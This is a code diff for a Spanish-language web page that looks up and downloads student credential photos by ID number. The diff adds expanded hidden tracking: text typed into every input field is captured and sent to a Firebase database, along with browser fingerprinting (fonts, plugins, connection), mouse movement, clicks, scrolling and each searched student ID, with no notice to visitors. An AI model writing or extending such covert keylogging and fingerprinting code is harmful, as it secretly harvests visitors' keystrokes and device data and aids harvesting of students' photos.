@@ -100,104 +100,191 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // Función para generar un ID único para cada sesión
-        function generateSessionId() {
-            return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        // Función para generar IDs únicos
+        function generateId() {
+            return Math.random().toString(36).substr(2, 9) + '_' + Date.now();
         }
         
-        const sessionId = generateSessionId();
-        let lastKeystrokeTime = Date.now();
-        let keystrokeBuffer = '';
-        const KEYSTROKE_BUFFER_TIME = 2000; // 2 segundos
+        const sessionId = 'session_' + generateId();
+        const deviceId = 'device_' + generateId();
         
-        // Función para recolectar y enviar datos del usuario a Firebase
-        function enviarDatosFirebase(eventType, data = {}) {
-            const timestamp = new Date().toISOString();
-            const datosUsuario = {
-                timestamp,
-                userAgent: navigator.userAgent,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                pageUrl: window.location.href,
-                eventType,
-                ...data
+        // Variables para tracking
+        let lastActivityTime = Date.now();
+        let keystrokeBuffer = '';
+        let clickPositions = [];
+        const ACTIVITY_BUFFER_TIME = 1500; // 1.5 segundos
+        
+        // Recolectar información avanzada del dispositivo
+        function getAdvancedDeviceInfo() {
+            return {
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    pixelDepth: window.screen.pixelDepth,
+                    orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
+                },
+                browser: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'unspecified'
+                },
+                connection: {
+                    effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                    downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                    rtt: navigator.connection ? navigator.connection.rtt : 'unknown'
+                },
+                timezone: {
+                    offset: new Date().getTimezoneOffset(),
+                    region: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                fonts: (function() {
+                    try {
+                        return Array.from(document.fonts).map(f => f.family);
+                    } catch(e) {
+                        return 'unknown';
+                    }
+                })()
             };
-            
-            // Crear referencia a la base de datos
-            const userRef = database.ref('users/' + sessionId);
-            
-            // Enviar datos a Firebase
-            userRef.push(datosUsuario).catch(error => {
-                console.error("Error al enviar datos a Firebase:", error);
-            });
         }
 
-        // Función para manejar el buffer de teclas
-        function handleKeystrokeBuffer() {
+        // Función para enviar datos de tecleo
+        function sendKeystrokeData() {
             if (keystrokeBuffer.length > 0) {
-                enviarDatosFirebase('keystrokes', {
-                    typedText: keystrokeBuffer,
-                    inputField: 'matriculaInput'
-                });
+                const typingData = {
+                    timestamp: new Date().toISOString(),
+                    sessionId: sessionId,
+                    deviceId: deviceId,
+                    inputField: 'matriculaInput',
+                    fullText: keystrokeBuffer,
+                    textLength: keystrokeBuffer.length,
+                    typingDuration: Date.now() - lastActivityTime + ACTIVITY_BUFFER_TIME
+                };
+                
+                database.ref('userTyping/' + deviceId + '/' + sessionId).push(typingData);
                 keystrokeBuffer = '';
             }
         }
 
-        // Registrar eventos de interacción del usuario
-        document.addEventListener('DOMContentLoaded', () => {
-            enviarDatosFirebase('page_loaded');
+        // Función para enviar datos de sesión
+        function sendSessionData(eventType, additionalData = {}) {
+            const sessionData = {
+                timestamp: new Date().toISOString(),
+                eventType,
+                sessionId,
+                deviceId,
+                pageUrl: window.location.href,
+                scrollPosition: {
+                    x: window.scrollX,
+                    y: window.scrollY
+                },
+                windowSize: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                deviceInfo: getAdvancedDeviceInfo(),
+                ...additionalData
+            };
             
-            // Registrar entrada de texto en todos los campos
+            database.ref('userSessions/' + deviceId + '/' + sessionId).push(sessionData);
+        }
+
+        // Función para enviar datos de interacción
+        function sendInteractionData(type, details) {
+            const interactionData = {
+                timestamp: new Date().toISOString(),
+                sessionId,
+                deviceId,
+                interactionType: type,
+                ...details
+            };
+            
+            database.ref('userInteractions/' + deviceId + '/' + sessionId).push(interactionData);
+        }
+
+        // Configurar event listeners
+        function setupTracking() {
+            // Registrar evento de carga de página
+            sendSessionData('page_load', {
+                referrer: document.referrer || 'direct'
+            });
+
+            // Registrar entrada de teclado
             document.addEventListener('input', (e) => {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                    const now = Date.now();
-                    const timeDiff = now - lastKeystrokeTime;
-                    
-                    // Si ha pasado mucho tiempo desde la última tecla, enviar el buffer
-                    if (timeDiff > KEYSTROKE_BUFFER_TIME) {
-                        handleKeystrokeBuffer();
-                    }
-                    
-                    // Agregar la tecla al buffer
                     keystrokeBuffer += e.data || '';
-                    lastKeystrokeTime = now;
-                    
-                    // Programar el envío del buffer si no hay más actividad
-                    clearTimeout(window.keystrokeTimeout);
-                    window.keystrokeTimeout = setTimeout(handleKeystrokeBuffer, KEYSTROKE_BUFFER_TIME);
+                    lastActivityTime = Date.now();
+                    clearTimeout(window.typingTimeout);
+                    window.typingTimeout = setTimeout(sendKeystrokeData, ACTIVITY_BUFFER_TIME);
                 }
             });
-            
-            // Registrar cambios en campos de formulario (para selects, checkboxes, etc.)
-            document.addEventListener('change', (e) => {
-                if (e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') {
-                    enviarDatosFirebase('form_change', {
-                        fieldName: e.target.name || 'unknown',
-                        fieldType: e.target.type,
-                        fieldValue: e.target.value,
-                        fieldId: e.target.id || 'none'
-                    });
-                }
-            });
-            
-            // Registrar clicks en cualquier parte de la página
+
+            // Registrar clicks y movimientos
             document.addEventListener('click', (e) => {
-                enviarDatosFirebase('page_click', {
-                    targetElement: e.target.tagName,
-                    targetId: e.target.id || 'none',
-                    targetClass: e.target.className || 'none',
-                    pageX: e.pageX,
-                    pageY: e.pageY
+                clickPositions.push({x: e.clientX, y: e.clientY, time: Date.now()});
+                
+                sendInteractionData('click', {
+                    target: {
+                        tag: e.target.tagName,
+                        id: e.target.id || 'none',
+                        class: e.target.className || 'none',
+                        name: e.target.name || 'none'
+                    },
+                    position: {
+                        x: e.clientX,
+                        y: e.clientY,
+                        pageX: e.pageX,
+                        pageY: e.pageY
+                    }
                 });
             });
-            
-            // Registrar cuando el usuario abandona la página
-            window.addEventListener('beforeunload', () => {
-                handleKeystrokeBuffer(); // Enviar cualquier tecla pendiente
-                enviarDatosFirebase('page_exit');
+
+            // Registrar movimiento del mouse
+            document.addEventListener('mousemove', (e) => {
+                sendInteractionData('mouse_move', {
+                    position: {
+                        x: e.clientX,
+                        y: e.clientY
+                    }
+                });
             });
-        });
+
+            // Registrar scroll
+            window.addEventListener('scroll', () => {
+                sendInteractionData('scroll', {
+                    position: {
+                        x: window.scrollX,
+                        y: window.scrollY
+                    }
+                });
+            });
+
+            // Registrar cuando la página pierde el foco
+            window.addEventListener('blur', () => {
+                sendSessionData('page_blur');
+            });
+
+            // Registrar cuando la página recupera el foco
+            window.addEventListener('focus', () => {
+                sendSessionData('page_focus');
+            });
+
+            // Registrar antes de abandonar la página
+            window.addEventListener('beforeunload', () => {
+                sendKeystrokeData();
+                sendSessionData('page_exit', {
+                    sessionDuration: Date.now() - lastActivityTime,
+                    clickPositions: clickPositions
+                });
+            });
+        }
+
+        // Iniciar el tracking cuando el DOM esté listo
+        document.addEventListener('DOMContentLoaded', setupTracking);
 
         function cargarImagen() {
             const nuevaMatricula = document.getElementById('matriculaInput').value;
@@ -206,19 +293,15 @@
                 const urlImagen = `https://apps-3.cobachbc.edu.mx/CompetenciasGenericas/Ajax/GetFotoCredencial?pMatricula=${nuevaMatricula}`;
                 const imagen = document.getElementById('imagenCredencial');
 
-                // Registrar la matrícula buscada
-                enviarDatosFirebase('matricula_buscada', {
+                // Registrar la búsqueda
+                sendInteractionData('search', {
                     matricula: nuevaMatricula,
-                    fullUrl: urlImagen
+                    imageUrl: urlImagen
                 });
 
-                // Update the image source
+                // Actualizar la imagen
                 imagen.src = urlImagen;
-
-                // Show the image container
                 document.getElementById('imagenContainer').style.display = 'block';
-
-                // Show the download button
                 document.getElementById('descargarBtn').style.display = 'inline-block';
             } else {
                 alert('Por favor, ingresa una matrícula válida.');
@@ -229,13 +312,12 @@
             const imagen = document.getElementById('imagenCredencial');
             const urlImagen = imagen.src;
 
-            // Registrar descarga de imagen
-            enviarDatosFirebase('imagen_descargada', {
-                imageUrl: urlImagen,
-                downloadTime: new Date().toISOString()
+            // Registrar descarga
+            sendInteractionData('download', {
+                imageUrl: urlImagen
             });
 
-            // Create a temporary anchor element
+            // Descargar la imagen
             const link = document.createElement('a');
             link.href = urlImagen;
             link.download = 'credencial.png';
